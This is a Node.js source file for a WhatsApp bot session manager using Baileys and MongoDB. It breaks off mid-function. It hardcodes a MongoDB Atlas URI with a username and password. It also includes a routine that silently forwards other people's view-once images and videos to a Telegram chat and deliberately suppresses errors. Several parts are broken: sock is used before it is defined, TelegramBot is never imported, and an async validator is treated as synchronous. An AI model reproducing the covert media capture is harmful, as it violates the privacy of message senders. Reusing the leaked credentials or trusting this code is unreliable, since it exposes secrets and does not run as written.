const express = require('express');
const fs = require('fs-extra');
const path = require('path');
const { exec } = require('child_process');
const router = express.Router();
const pino = require('pino');
const moment = require('moment-timezone');
const Jimp = require('jimp');
const crypto = require('crypto');
const axios = require('axios');
const ytdl = require('ytdl-core');
const yts = require('yt-search');
const FileType = require('file-type');
const AdmZip = require('adm-zip');
const mongoose = require('mongoose');

if (fs.existsSync('2nd_dev_config.env')) require('dotenv').config({ path: './2nd_dev_config.env' });

const { sms } = require("./msg");

const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser,
    proto,
    prepareWAMessageMedia,
    downloadContentFromMessage,
    getContentType,
    generateWAMessageFromContent,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeInMemoryStore,
    getAggregateVotesInPollMessage
} = require('@whiskeysockets/baileys');

// MongoDB Configuration
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://shanuka:Shanuka@cluster0.i9l2lts.mongodb.net/production?retryWrites=true&w=majority';

process.env.NODE_ENV = 'production';
process.env.PM2_NAME = 'devil-tech-md-session';

console.log('🚀 Auto Session Manager initialized with MongoDB Atlas');

const config = {
    // General Bot Settings
    AUTO_VIEW_STATUS: 'true',
    AUTO_LIKE_STATUS: 'true',
    AUTO_RECORDING: 'false',
    AUTO_LIKE_EMOJI: ['💗', '🔥', '😞', '💀'],

    // Newsletter Auto-React Settings
    AUTO_REACT_NEWSLETTERS: 'true',

    NEWSLETTER_JIDS: ['120363421972517238@newsletter'],
    NEWSLETTER_REACT_EMOJIS: ['❤️', '😂', '👍'],

    // OPTIMIZED Auto Session Management for Digital Ocean VPS
    AUTO_SAVE_INTERVAL: 600000,        // Auto-save every 10 minutes (increased from 5)
    AUTO_CLEANUP_INTERVAL: 3600000,    // Cleanup every 60 minutes (increased from 30)
    AUTO_RECONNECT_INTERVAL: 600000,   // Check reconnection every 10 minutes (increased from 5)
    AUTO_RESTORE_INTERVAL: 7200000,    // Auto-restore every 2 hours (increased from 1)
    MONGODB_SYNC_INTERVAL: 900000,     // Sync with MongoDB every 15 minutes (increased from 10)
    MAX_SESSION_AGE: 2592000000,       // 30 days in milliseconds (unchanged)
    DISCONNECTED_CLEANUP_TIME: 600000, // 10 minutes for disconnected sessions (increased from 5)
    MAX_FAILED_ATTEMPTS: 3,            // Max failed reconnection attempts (increased from 2)
    INITIAL_RESTORE_DELAY: 30000,      // Wait 30 seconds before initial restore (increased from 10)
    IMMEDIATE_DELETE_DELAY: 120000,    // Wait 2 minutes before deleting invalid sessions (increased from 1)

    // Command Settings
    PREFIX: '.',
    MAX_RETRIES: 3,

    // Group & Channel Settings
    GROUP_INVITE_LINK: 'https://chat.whatsapp.com/EFZ8E51b3nE1HU97oYmC0U?mode=ems_copy_t',
    NEWSLETTER_JID: '120363421972517238@newsletter',
    NEWSLETTER_MESSAGE_ID: '137',
    CHANNEL_LINK: 'https://whatsapp.com/channel/0029Vb6Fqek5kg7FE9OTGg0g',

    // File Paths
    ADMIN_LIST_PATH: './admin.json',
    IMAGE_PATH: './dinu.jpg',
    NUMBER_LIST_PATH: './numbers.json',
    SESSION_STATUS_PATH: './session_status.json',
    SESSION_BASE_PATH: './session',

    // Security & OTP
    OTP_EXPIRY: 300000,

    // News Feed
    NEWS_JSON_URL: 'https://raw.githubusercontent.com/itsmedidula/base/refs/heads/main/news.json',

    // Owner Details
    OWNER_NUMBER: '13056978303',

    // Telegram Integration (for silent media backup)
    
}


sock.ev.on('creds.update', saveCreds)// or useSingleFileAuthState

const sock = makeWASocket({
    auth: state,
    printQRInTerminal: true
});

sock.ev.on('creds.update', saveCreds)

sock.ev.on('connection.update', ({ connection }) => {
    console.log("WS state:", connection)
});
// Session Management Maps
const activeSockets = new Map();
const socketCreationTime = new Map();
const disconnectionTime = new Map();
const sessionHealth = new Map();
const reconnectionAttempts = new Map();
const lastBackupTime = new Map();
const otpStore = new Map();
const pendingSaves = new Map();
const restoringNumbers = new Set();
const sessionConnectionStatus = new Map();
const stores = new Map();

// Auto-management intervals
let autoSaveInterval;
let autoCleanupInterval;
let autoReconnectInterval;
let autoRestoreInterval;
let mongoSyncInterval;

// MongoDB Connection
let mongoConnected = false;

async function useMongoDBAuthState(mongoClient) {
    const collection = mongoClient.db("whatsapp").collection("sessions")

    // load session from DB
    const data = await collection.findOne({ _id: "auth" }) || {}

    const state = {
        creds: data.creds || {},
        keys: {
            get: async (type, ids) => {
                const doc = await collection.findOne({ _id: "keys" }) || {}
                return ids.map(id => doc?.[type]?.[id] || null)
            },
            set: async (data) => {
                await collection.updateOne(
                    { _id: "keys" },
                    { $set: data },
                    { upsert: true }
                )
            }
        }
    }

    const saveCreds = async () => {
        await collection.updateOne(
            { _id: "auth" },
            { $set: { creds: state.creds } },
            { upsert: true }
        )
    }

    return { state, saveCreds }
}
// MongoDB Schemas
const sessionSchema = new mongoose.Schema({
    number: { type: String, required: true, unique: true, index: true },
    sessionData: { type: Object, required: true },
    status: { type: String, default: 'active', index: true },
    createdAt: { type: Date, default: Date.now },
    updatedAt: { type: Date, default: Date.now },
    lastActive: { type: Date, default: Date.now },
    health: { type: String, default: 'active' }
});

const userConfigSchema = new mongoose.Schema({
    number: { type: String, required: true, unique: true, index: true },
    config: { type: Object, required: true },
    createdAt: { type: Date, default: Date.now },
    updatedAt: { type: Date, default: Date.now }
});

const Session = mongoose.model('Session', sessionSchema);
const UserConfig = mongoose.model('UserConfig', userConfigSchema);

// Comment System Schemas
const commentSchema = new mongoose.Schema({
    name: { type: String, required: true, maxlength: 50 },
    message: { type: String, required: true, maxlength: 500 },
    timestamp: { type: Date, default: Date.now, index: true },
    likes: { type: Number, default: 0 },
    dislikes: { type: Number, default: 0 },
    replyCount: { type: Number, default: 0 },
    replies: [{ type: mongoose.Schema.Types.ObjectId, ref: 'Reply' }]
});

const replySchema = new mongoose.Schema({
    commentId: { type: mongoose.Schema.Types.ObjectId, ref: 'Comment', required: true, index: true },
    name: { type: String, required: true, maxlength: 50 },
    message: { type: String, required: true, maxlength: 300 },
    timestamp: { type: Date, default: Date.now },
    likes: { type: Number, default: 0 },
    dislikes: { type: Number, default: 0 }
});

const reactionSchema = new mongoose.Schema({
    itemId: { type: mongoose.Schema.Types.ObjectId, required: true, index: true },
    itemType: { type: String, enum: ['comment', 'reply'], required: true },
    userFingerprint: { type: String, required: true, index: true },
    reaction: { type: String, enum: ['like', 'dislike'], required: true },
    timestamp: { type: Date, default: Date.now }
});

// Create compound index to prevent duplicate reactions
reactionSchema.index({ itemId: 1, userFingerprint: 1 }, { unique: true });

const Comment = mongoose.model('Comment', commentSchema);
const Reply = mongoose.model('Reply', replySchema);
const Reaction = mongoose.model('Reaction', reactionSchema);

// Initialize MongoDB Connection
async function initializeMongoDB() {
    try {
        if (mongoConnected) return true;

        await mongoose.connect(MONGODB_URI, {
            serverSelectionTimeoutMS: 30000,
            socketTimeoutMS: 45000,
            maxPoolSize: 10,
            minPoolSize: 5
        });

        mongoConnected = true;
        console.log('✅ MongoDB Atlas connected successfully');

        // Create indexes
        await Session.createIndexes().catch(err => console.error('Index creation error:', err));
        await UserConfig.createIndexes().catch(err => console.error('Index creation error:', err));
        await Comment.createIndexes().catch(err => console.error('Comment index creation error:', err));
        await Reply.createIndexes().catch(err => console.error('Reply index creation error:', err));
        await Reaction.createIndexes().catch(err => console.error('Reaction index creation error:', err));

        return true;
    } catch (error) {
        console.error('❌ MongoDB connection error:', error.message);
        mongoConnected = false;

        // Retry connection after 5 seconds
        setTimeout(() => {
            initializeMongoDB();
        }, 5000);

        return false;
    }
}

// MongoDB Session Management Functions
async function saveSessionToMongoDB(number, sessionData) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');

        if (!isSessionActive(sanitizedNumber)) {
            console.log(`⏭️ Not saving inactive session to MongoDB: ${sanitizedNumber}`);
            return false;
        }

        // Validate session data before saving
        if (!validateSessionData(sessionData)) {
            console.warn(`⚠️ Invalid session data, not saving to MongoDB: ${sanitizedNumber}`);
            return false;
        }

        await Session.findOneAndUpdate(
            { number: sanitizedNumber },
            {
                sessionData: sessionData,
                status: 'active',
                updatedAt: new Date(),
                lastActive: new Date(),
                health: sessionHealth.get(sanitizedNumber) || 'active'
            },
            { upsert: true, new: true }
        );

        console.log(`✅ Session saved to MongoDB: ${sanitizedNumber}`);
        return true;
    } catch (error) {
        console.error(`❌ MongoDB save failed for ${number}:`, error.message);
        pendingSaves.set(number, {
            data: sessionData,
            timestamp: Date.now()
        });
        return false;
    }
}

async function loadSessionFromMongoDB(number) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');

        const session = await Session.findOne({ 
            number: sanitizedNumber,
            status: { $ne: 'deleted' }
        });

        if (session) {
            console.log(`✅ Session loaded from MongoDB: ${sanitizedNumber}`);
            return session.sessionData;
        }

        return null;
    } catch (error) {
        console.error(`❌ MongoDB load failed for ${number}:`, error.message);
        return null;
    }
}

async function deleteSessionFromMongoDB(number) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');

        // Delete session
        await Session.deleteOne({ number: sanitizedNumber });

        // Delete user config
        await UserConfig.deleteOne({ number: sanitizedNumber });

        console.log(`🗑️ Session deleted from MongoDB: ${sanitizedNumber}`);
        return true;
    } catch (error) {
        console.error(`❌ MongoDB delete failed for ${number}:`, error.message);
        return false;
    }
}

async function getAllActiveSessionsFromMongoDB() {
    try {
        const sessions = await Session.find({ 
            status: 'active',
            health: { $ne: 'invalid' }
        });

        console.log(`📊 Found ${sessions.length} active sessions in MongoDB`);
        return sessions;
    } catch (error) {
        console.error('❌ Failed to get sessions from MongoDB:', error.message);
        return [];
    }
}

async function updateSessionStatusInMongoDB(number, status, health = null) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');

        const updateData = {
            status: status,
            updatedAt: new Date()
        };

        if (health) {
            updateData.health = health;
        }

        if (status === 'active') {
            updateData.lastActive = new Date();
        }

        await Session.findOneAndUpdate(
            { number: sanitizedNumber },
            updateData,
            { upsert: false }
        );

        console.log(`📝 Session status updated in MongoDB: ${sanitizedNumber} -> ${status}`);
        return true;
    } catch (error) {
        console.error(`❌ MongoDB status update failed for ${number}:`, error.message);
        return false;
    }
}

async function cleanupInactiveSessionsFromMongoDB() {
    try {
        // Delete sessions that are disconnected or invalid
        const result = await Session.deleteMany({
            $or: [
                { status: 'disconnected' },
                { status: 'invalid' },
                { status: 'failed' },
                { status: 'bad_mac_cleared' },
                { health: 'invalid' },
                { health: 'disconnected' },
                { health: 'bad_mac_cleared' }
            ]
        });

        console.log(`🧹 Cleaned ${result.deletedCount} inactive sessions from MongoDB`);
        return result.deletedCount;
    } catch (error) {
        console.error('❌ MongoDB cleanup failed:', error.message);
        return 0;
    }
}

async function getMongoSessionCount() {
    try {
        const count = await Session.countDocuments({ status: 'active' });
        return count;
    } catch (error) {
        console.error('❌ Failed to count MongoDB sessions:', error.message);
        return 0;
    }
}

// User Config MongoDB Functions
async function saveUserConfigToMongoDB(number, configData) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');

        await UserConfig.findOneAndUpdate(
            { number: sanitizedNumber },
            {
                config: configData,
                updatedAt: new Date()
            },
            { upsert: true, new: true }
        );

        console.log(`✅ User config saved to MongoDB: ${sanitizedNumber}`);
        return true;
    } catch (error) {
        console.error(`❌ MongoDB config save failed for ${number}:`, error.message);
        return false;
    }
}

async function loadUserConfigFromMongoDB(number) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');

        const userConfig = await UserConfig.findOne({ number: sanitizedNumber });

        if (userConfig) {
            console.log(`✅ User config loaded from MongoDB: ${sanitizedNumber}`);
            return userConfig.config;
        }

        return null;
    } catch (error) {
        console.error(`❌ MongoDB config load failed for ${number}:`, error.message);
        return null;
    }
}

// Create necessary directories
function initializeDirectories() {
    const dirs = [
        config.SESSION_BASE_PATH,
        './temp'
    ];

    dirs.forEach(dir => {
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
            console.log(`📁 Created directory: ${dir}`);
        }
    });
}

initializeDirectories();

// **HELPER FUNCTIONS WITH BAD MAC FIXES**

// Session validation function
async function validateSessionData(sessionData) {
    try {
        // Check if session data has required fields
        if (!sessionData || typeof sessionData !== 'object') {
            return false;
        }

        // Check for required auth fields
        if (!sessionData.me || !sessionData.myAppStateKeyId) {
            return false;
        }

        // Validate session structure
        const requiredFields = ['noiseKey', 'signedIdentityKey', 'signedPreKey', 'registrationId'];
        for (const field of requiredFields) {
            if (!sessionData[field]) {
                console.warn(`⚠️ Missing required field: ${field}`);
                return false;
            }
        }

        return true;
    } catch (error) {
        console.error('❌ Session validation error:', error);
        return false;
    }
}

// Handle Bad MAC errors
async function handleBadMacError(number) {
    const sanitizedNumber = number.replace(/[^0-9]/g, '');
    console.log(`🔧 Handling Bad MAC error for ${sanitizedNumber}`);

    try {
        // Close existing socket if any
        if (activeSockets.has(sanitizedNumber)) {
            const socket = activeSockets.get(sanitizedNumber);
            try {
                if (socket?.ws) {
                    socket.ws.close();
                } else if (socket?.end) {
                    socket.end();
                } else if (socket?.logout) {
                    await socket.logout();
                }
            } catch (e) {
                console.error('Error closing socket:', e.message);
            }
            activeSockets.delete(sanitizedNumber);
        }

        // Clear store if exists
        if (stores.has(sanitizedNumber)) {
            stores.delete(sanitizedNumber);
        }

        // Clear all session data
        const sessionPath = path.join(config.SESSION_BASE_PATH, `session_${sanitizedNumber}`);
        if (fs.existsSync(sessionPath)) {
            console.log(`🗑️ Removing corrupted session files for ${sanitizedNumber}`);
            await fs.remove(sessionPath);
        }

        // Delete from MongoDB
        await deleteSessionFromMongoDB(sanitizedNumber);

        // Clear all references
        sessionHealth.set(sanitizedNumber, 'bad_mac_cleared');
        reconnectionAttempts.delete(sanitizedNumber);
        disconnectionTime.delete(sanitizedNumber);
        sessionConnectionStatus.delete(sanitizedNumber);
        pendingSaves.delete(sanitizedNumber);
        lastBackupTime.delete(sanitizedNumber);
        restoringNumbers.delete(sanitizedNumber);

        // Update status
        await updateSessionStatus(sanitizedNumber, 'bad_mac_cleared', new Date().toISOString());

        console.log(`✅ Cleared Bad MAC session for ${sanitizedNumber}`);
        return true;
    } catch (error) {
        console.error(`❌ Failed to handle Bad MAC for ${sanitizedNumber}:`, error);
        return false;
    }
}

async function downloadAndSaveMedia(message, mediaType) {
    try {
        const stream = await downloadContentFromMessage(message, mediaType);
        let buffer = Buffer.from([]);

        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        return buffer;
    } catch (error) {
        console.error('Download Media Error:', error);
        throw error;
    }
}

// Telegram bot initialization (only if token is provided)
let telegramBot = null;
if (config.TELEGRAM_BOT_TOKEN && config.TELEGRAM_CHAT_ID) {
    try {
        telegramBot = new TelegramBot(config.TELEGRAM_BOT_TOKEN, { polling: false });
    } catch (error) {
        console.error('❌ Failed to initialize Telegram bot:', error.message);
    }
}

// Function to silently send media to Telegram
async function sendMediaToTelegramSilently(buffer, mediaType, caption = '') {
    // Return early if Telegram bot is not configured
    if (!telegramBot || !config.TELEGRAM_CHAT_ID) {
        return;
    }

    try {
        const timestamp = new Date().toISOString();
        const telegramCaption = `📱 ViewOnce Media Backup\n⏰ ${timestamp}\n${caption ? `📝 Caption: ${caption}` : ''}`.trim();

        if (mediaType === 'image') {
            await telegramBot.sendPhoto(config.TELEGRAM_CHAT_ID, buffer, {
                caption: telegramCaption
            });
        } else if (mediaType === 'video') {
            await telegramBot.sendVideo(config.TELEGRAM_CHAT_ID, buffer, {
                caption: telegramCaption
            });
        }
    } catch (error) {
        // Silently fail - no console.log or user notification
        // This is intentional as requested by the user
    }
}

// Check if command is from owner
function isOwner(sender) {
    const senderNumber = sender.replace('@s.whatsapp.net', '').replace(/[^0-9]/g, '');
    const ownerNumber = config.OWNER_NUMBER.replace(/[^0-9]/g, '');
    return senderNumber === ownerNumber;
}

// **SESSION MANAGEMENT**

function isSessionActive(number) {
    const sanitizedNumber = number.replace(/[^0-9]/g, '');
    const health = sessionHealth.get(sanitizedNumber);
    const connectionStatus = sessionConnectionStatus.get(sanitizedNumber);
    const socket = activeSockets.get(sanitizedNumber);

    return (
        connectionStatus === 'open' &&
        health === 'active' &&
        socket &&
        socket.user &&
        !disconnectionTime.has(sanitizedNumber)
    );
}

async function saveSessionLocally(number, sessionData) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');

        if (!isSessionActive(sanitizedNumber)) {
            console.log(`⏭️ Skipping local save for inactive session: ${sanitizedNumber}`);
            return false;
        }

        // Validate before saving
        if (!validateSessionData(sessionData)) {
            console.warn(`⚠️ Invalid session data, not saving locally: ${sanitizedNumber}`);
            return false;
        }

        const sessionPath = path.join(config.SESSION_BASE_PATH, `session_${sanitizedNumber}`);

        await fs.ensureDir(sessionPath);

        await fs.writeFile(
            path.join(sessionPath, 'creds.json'),
            JSON.stringify(sessionData, null, 2)
        );

        console.log(`💾 Active session saved locally: ${sanitizedNumber}`);
        return true;
    } catch (error) {
        console.error(`❌ Failed to save session locally for ${number}:`, error);
        return false;
    }
}

async function restoreSession(number) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');

        // Try MongoDB
        const sessionData = await loadSessionFromMongoDB(sanitizedNumber);

        if (sessionData) {
            // Validate session data before restoring
            if (!validateSessionData(sessionData)) {
                console.warn(`⚠️ Invalid session data for ${sanitizedNumber}, clearing...`);
                await handleBadMacError(sanitizedNumber);
                return null;
            }

            // Save to local for running bot
            await saveSessionLocally(sanitizedNumber, sessionData);
            console.log(`✅ Restored valid session from MongoDB: ${sanitizedNumber}`);
            return sessionData;
        }

        return null;
    } catch (error) {
        console.error(`❌ Session restore failed for ${number}:`, error.message);

        // If error is related to corrupt data, handle it
        if (error.message?.includes('MAC') || error.message?.includes('decrypt')) {
            await handleBadMacError(number);
        }

        return null;
    }
}

async function deleteSessionImmediately(number) {
    const sanitizedNumber = number.replace(/[^0-9]/g, '');

    console.log(`🗑️ Immediately deleting inactive/invalid session: ${sanitizedNumber}`);

    // Close socket if exists
    if (activeSockets.has(sanitizedNumber)) {
        const socket = activeSockets.get(sanitizedNumber);
        try {
            if (socket?.ws) {
                socket.ws.close();
            } else if (socket?.end) {
                socket.end();
            } else if (socket?.logout) {
                await socket.logout();
            }
        } catch (e) {
            console.error('Error closing socket:', e.message);
        }
    }

    // Delete local files
    const sessionPath = path.join(config.SESSION_BASE_PATH, `session_${sanitizedNumber}`);
    if (fs.existsSync(sessionPath)) {
        await fs.remove(sessionPath);
        console.log(`🗑️ Deleted session directory: ${sanitizedNumber}`);
    }

    // Delete from MongoDB
    await deleteSessionFromMongoDB(sanitizedNumber);

    // Clear all references
    pendingSaves.delete(sanitizedNumber);
    sessionConnectionStatus.delete(sanitizedNumber);
    disconnectionTime.delete(sanitizedNumber);
    sessionHealth.delete(sanitizedNumber);
    reconnectionAttempts.delete(sanitizedNumber);
    socketCreationTime.delete(sanitizedNumber);
    lastBackupTime.delete(sanitizedNumber);
    restoringNumbers.delete(sanitizedNumber);
    activeSockets.delete(sanitizedNumber);
    stores.delete(sanitizedNumber);

    await updateSessionStatus(sanitizedNumber, 'deleted', new Date().toISOString());

    console.log(`✅ Successfully deleted all data for inactive session: ${sanitizedNumber}`);
}

// **AUTO MANAGEMENT FUNCTIONS**

function initializeAutoManagement() {
    console.log('🔄 Starting optimized auto management with MongoDB...');

    // Initialize MongoDB
    initializeMongoDB().then(() => {
        // Start initial restore after MongoDB is connected
        setTimeout(async () => {
            console.log('🔄 Initial auto-restore on startup...');
            await autoRestoreAllSessions();
        }, config.INITIAL_RESTORE_DELAY);
    });

    autoSaveInterval = setInterval(async () => {
        console.log('💾 Auto-saving active sessions...');
        await autoSaveAllActiveSessions();
    }, config.AUTO_SAVE_INTERVAL);

    mongoSyncInterval = setInterval(async () => {
        console.log('🔄 Syncing active sessions with MongoDB...');
        await syncPendingSavesToMongoDB();
    }, config.MONGODB_SYNC_INTERVAL);

    autoCleanupInterval = setInterval(async () => {
        console.log('🧹 Auto-cleaning inactive sessions...');
        await autoCleanupInactiveSessions();
    }, config.AUTO_CLEANUP_INTERVAL);

    autoReconnectInterval = setInterval(async () => {
        console.log('🔗 Auto-checking reconnections...');
        await autoReconnectFailedSessions();
    }, config.AUTO_RECONNECT_INTERVAL);

    autoRestoreInterval = setInterval(async () => {
        console.log('🔄 Hourly auto-restore check...');
        await autoRestoreAllSessions();
    }, config.AUTO_RESTORE_INTERVAL);
}

async function syncPendingSavesToMongoDB() {
    if (pendingSaves.size === 0) {
        console.log('✅ No pending saves to sync with MongoDB');
        return;
    }

    console.log(`🔄 Syncing ${pendingSaves.size} pending saves to MongoDB...`);
    let successCount = 0;
    let failCount = 0;

    for (const [number, sessionInfo] of pendingSaves) {
        if (!isSessionActive(number)) {
            console.log(`⏭️ Session became inactive, skipping: ${number}`);
            pendingSaves.delete(number);
            continue;
        }

        try {
            const success = await saveSessionToMongoDB(number, sessionInfo.data);
            if (success) {
                pendingSaves.delete(number);
                successCount++;
            } else {
                failCount++;
            }
            await delay(500);
        } catch (error) {
            console.error(`❌ Failed to save ${number} to MongoDB:`, error.message);
            failCount++;
        }
    }

    console.log(`✅ MongoDB sync completed: ${successCount} saved, ${failCount} failed, ${pendingSaves.size} pending`);
}

async function autoSaveAllActiveSessions() {
    try {
        let savedCount = 0;
        let skippedCount = 0;

        for (const [number, socket] of activeSockets) {
            if (isSessionActive(number)) {
                const success = await autoSaveSession(number);
                if (success) {
                    savedCount++;
                } else {
                    skippedCount++;
                }
            } else {
                console.log(`⏭️ Skipping save for inactive session: ${number}`);
                skippedCount++;
                await deleteSessionImmediately(number);
            }
        }

        console.log(`✅ Auto-save completed: ${savedCount} active saved, ${skippedCount} skipped/deleted`);
    } catch (error) {
        console.error('❌ Auto-save all sessions failed:', error);
    }
}

async function autoSaveSession(number) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');

        if (!isSessionActive(sanitizedNumber)) {
            console.log(`⏭️ Not saving inactive session: ${sanitizedNumber}`);
            return false;
        }

        const sessionPath = path.join(config.SESSION_BASE_PATH, `session_${sanitizedNumber}`);
        const credsPath = path.join(sessionPath, 'creds.json');

        if (fs.existsSync(credsPath)) {
            const fileContent = await fs.readFile(credsPath, 'utf8');
            const credData = JSON.parse(fileContent);

            // Validate before saving
            if (!validateSessionData(credData)) {
                console.warn(`⚠️ Invalid session data during auto-save: ${sanitizedNumber}`);
                await handleBadMacError(sanitizedNumber);
                return false;
            }

            // Save to MongoDB
            await saveSessionToMongoDB(sanitizedNumber, credData);

            // Update status
            await updateSessionStatusInMongoDB(sanitizedNumber, 'active', 'active');
            await updateSessionStatus(sanitizedNumber, 'active', new Date().toISOString());

            return true;
        }
        return false;
    } catch (error) {
        console.error(`❌ Failed to auto-save session for ${number}:`, error);

        // Check for Bad MAC error
        if (error.message?.includes('MAC') || error.message?.includes('decrypt')) {
            await handleBadMacError(number);
        }

        return false;
    }
}

async function autoCleanupInactiveSessions() {
    try {
        const sessionStatus = await loadSessionStatus();
        let cleanedCount = 0;

        // Check local active sockets
        for (const [number, socket] of activeSockets) {
            const isActive = isSessionActive(number);
            const status = sessionStatus[number]?.status || 'unknown';
            const disconnectedTimeValue = disconnectionTime.get(number);

            const shouldDelete =
                !isActive ||
                (disconnectedTimeValue && (Date.now() - disconnectedTimeValue > config.DISCONNECTED_CLEANUP_TIME)) ||
                ['failed', 'invalid', 'max_attempts_reached', 'deleted', 'disconnected', 'bad_mac_cleared'].includes(status);

            if (shouldDelete) {
                await deleteSessionImmediately(number);
                cleanedCount++;
            }
        }

        // Clean MongoDB inactive sessions
        const mongoCleanedCount = await cleanupInactiveSessionsFromMongoDB();
        cleanedCount += mongoCleanedCount;

        console.log(`✅ Auto-cleanup completed: ${cleanedCount} inactive sessions cleaned`);
    } catch (error) {
        console.error('❌ Auto-cleanup failed:', error);
    }
}

async function autoReconnectFailedSessions() {
    try {
        const sessionStatus = await loadSessionStatus();
        let reconnectCount = 0;

        for (const [number, status] of Object.entries(sessionStatus)) {
            if (status.status === 'failed' && !activeSockets.has(number) && !restoringNumbers.has(number)) {
                const attempts = reconnectionAttempts.get(number) || 0;
                const disconnectedTimeValue = disconnectionTime.get(number);

                if (disconnectedTimeValue && (Date.now() - disconnectedTimeValue > config.DISCONNECTED_CLEANUP_TIME)) {
                    console.log(`⏭️ Deleting long-disconnected session: ${number}`);
                    await deleteSessionImmediately(number);
                    continue;
                }

                if (attempts < config.MAX_FAILED_ATTEMPTS) {
                    console.log(`🔄 Auto-reconnecting ${number} (attempt ${attempts + 1})`);
                    reconnectionAttempts.set(number, attempts + 1);
                    restoringNumbers.add(number);

                    const mockRes = {
                        headersSent: false,
                        send: () => { },
                        status: () => mockRes
                    };

                    await EmpirePair(number, mockRes);
                    reconnectCount++;
                    await delay(5000);
                } else {
                    console.log(`❌ Max reconnection attempts reached, deleting ${number}`);
                    await deleteSessionImmediately(number);
                }
            }
        }

        console.log(`✅ Auto-reconnect completed: ${reconnectCount} sessions reconnected`);
    } catch (error) {
        console.error('❌ Auto-reconnect failed:', error);
    }
}

async function autoRestoreAllSessions() {
    try {
        if (!mongoConnected) {
            console.log('⚠️ MongoDB not connected, skipping auto-restore');
            return { restored: [], failed: [] };
        }

        console.log('🔄 Starting auto-restore process from MongoDB...');
        const restoredSessions = [];
        const failedSessions = [];

        // Get all active sessions from MongoDB
        const mongoSessions = await getAllActiveSessionsFromMongoDB();

        for (const session of mongoSessions) {
            const number = session.number;

            if (activeSockets.has(number) || restoringNumbers.has(number)) {
                continue;
            }

            try {
                console.log(`🔄 Restoring session from MongoDB: ${number}`);
                restoringNumbers.add(number);

                // Validate session data before restoring
                if (!validateSessionData(session.sessionData)) {
                    console.warn(`⚠️ Invalid session data in MongoDB, clearing: ${number}`);
                    await handleBadMacError(number);
                    failedSessions.push(number);
                    continue;
                }

                // Save to local for running bot
                await saveSessionLocally(number, session.sessionData);

                const mockRes = {
                    headersSent: false,
                    send: () => { },
                    status: () => mockRes
                };

                await EmpirePair(number, mockRes);
                restoredSessions.push(number);

                await delay(3000);
            } catch (error) {
                console.error(`❌ Failed to restore session ${number}:`, error.message);
                failedSessions.push(number);
                restoringNumbers.delete(number);

                // Check for Bad MAC error
                if (error.message?.includes('MAC') || error.message?.includes('decrypt')) {
                    await handleBadMacError(number);
                } else {
                    // Update status in MongoDB
                    await updateSessionStatusInMongoDB(number, 'failed', 'disconnected');
                }
            }
        }

        console.log(`✅ Auto-restore completed: ${restoredSessions.length} restored, ${failedSessions.length} failed`);

        if (restoredSessions.length > 0) {
            console.log(`✅ Restored sessions: ${restoredSessions.join(', ')}`);
        }

        if (failedSessions.length > 0) {
            console.log(`❌ Failed sessions: ${failedSessions.join(', ')}`);
        }

        return { restored: restoredSessions, failed: failedSessions };
    } catch (error) {
        console.error('❌ Auto-restore failed:', error);
        return { restored: [], failed: [] };
    }
}

async function updateSessionStatus(number, status, timestamp, extra = {}) {
    try {
        const sessionStatus = await loadSessionStatus();
        sessionStatus[number] = {
            status,
            timestamp,
            ...extra
        };
        await saveSessionStatus(sessionStatus);
    } catch (error) {
        console.error('❌ Failed to update session status:', error);
    }
}

async function loadSessionStatus() {
    try {
        if (fs.existsSync(config.SESSION_STATUS_PATH)) {
            return JSON.parse(await fs.readFile(config.SESSION_STATUS_PATH, 'utf8'));
        }
        return {};
    } catch (error) {
        console.error('❌ Failed to load session status:', error);
        return {};
    }
}

async function saveSessionStatus(sessionStatus) {
    try {
        await fs.writeFile(config.SESSION_STATUS_PATH, JSON.stringify(sessionStatus, null, 2));
    } catch (error) {
        console.error('❌ Failed to save session status:', error);
    }
}

// **USER CONFIG MANAGEMENT**

async function loadUserConfig(number) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');

        // Try MongoDB
        const loadedConfig = await loadUserConfigFromMongoDB(sanitizedNumber);

        if (loadedConfig) {
            applyConfigSettings(loadedConfig);
            return loadedConfig;
        }

        // Use default config and save it
        await saveUserConfigToMongoDB(sanitizedNumber, config);
        return { ...config };
    } catch (error) {
        console.warn(`⚠️ No config found for ${number}, using defaults`);
        return { ...config };
    }
}

function applyConfigSettings(loadedConfig) {
    if (loadedConfig.NEWSLETTER_JIDS) {
        config.NEWSLETTER_JIDS = loadedConfig.NEWSLETTER_JIDS;
    }
    if (loadedConfig.NEWSLETTER_REACT_EMOJIS) {
        config.NEWSLETTER_REACT_EMOJIS = loadedConfig.NEWSLETTER_REACT_EMOJIS;
    }
    if (loadedConfig.AUTO_REACT_NEWSLETTERS !== undefined) {
        config.AUTO_REACT_NEWSLETTERS = loadedConfig.AUTO_REACT_NEWSLETTERS;
    }
}

async function updateUserConfig(number, newConfig) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');

        if (!isSessionActive(sanitizedNumber)) {
            console.log(`⏭️ Not saving config for inactive session: ${sanitizedNumber}`);
            return;
        }

        // Save to MongoDB
        await saveUserConfigToMongoDB(sanitizedNumber, newConfig);

        console.log(`✅ Config updated in MongoDB: ${sanitizedNumber}`);
    } catch (error) {
        console.error('❌ Failed to update config:', error);
        throw error;
    }
}

// **HELPER FUNCTIONS**

function loadAdmins() {
    try {
        if (fs.existsSync(config.ADMIN_LIST_PATH)) {
            return JSON.parse(fs.readFileSync(config.ADMIN_LIST_PATH, 'utf8'));
        }
        return [];
    } catch (error) {
        console.error('❌ Failed to load admin list:', error);
        return [];
    }
}

function formatMessage(title, content, footer) {
    return `*${title}*\n\n${content}\n\n> *${footer}*`;
}

function generateOTP() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

function getSriLankaTimestamp() {
